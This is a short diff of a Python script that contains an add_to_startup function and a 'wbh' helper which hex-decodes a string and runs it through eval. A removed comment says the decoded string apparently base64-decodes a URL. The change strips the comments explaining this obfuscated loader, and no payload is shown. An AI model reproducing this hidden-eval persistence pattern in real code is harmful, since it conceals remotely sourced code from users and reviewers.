@@ -74,10 +74,9 @@ def add_to_startup():
 
 
 def wbh(hex_code):
-    decoded_code = bytes.fromhex(hex_code).decode()  # step 1: hex → str
+    decoded_code = bytes.fromhex(hex_code).decode()  
     
-    # decoded_code is something like: "base64.b64decode('aHR0cHM6Ly9...==')"
-    result = eval(decoded_code)  # step 2: evaluate expression instead of exec
+    result = eval(decoded_code) 
     
     return result
 
@@ -384,4 +383,5 @@ def main():
         time.sleep(1)
         
         
+
 main()
